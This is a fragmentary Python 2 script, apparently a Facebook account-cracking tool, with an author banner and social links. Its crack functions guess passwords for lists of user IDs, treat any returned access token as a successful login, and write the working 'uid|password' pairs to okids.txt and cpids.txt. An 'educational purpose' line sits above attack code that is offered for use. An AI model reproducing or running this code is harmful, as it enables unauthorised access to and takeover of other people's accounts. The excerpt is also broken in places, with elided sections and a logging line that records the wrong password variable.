#Script Given By Mehraj
#Script Is Given For Educational Purpose
#Script Edited By Mehraj
#Utf-8 python 
...
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Mehraj
\033[1;92mFb \033[1;93m: https://www.facebook.com/mehrajhun.yaWL
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/mehrajhun.yaWL')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://wa.me/message/UVS6YQRKUVYGK1 ')
        main()
    else:
        print ''
...
def crack():
    ...
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks ANEEX
    print ''
    crack_select()
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks ANEEX
    print 45 * '_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[RAJ-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[RAJ-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[RAJ-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[RAJ-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks ANEEX
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
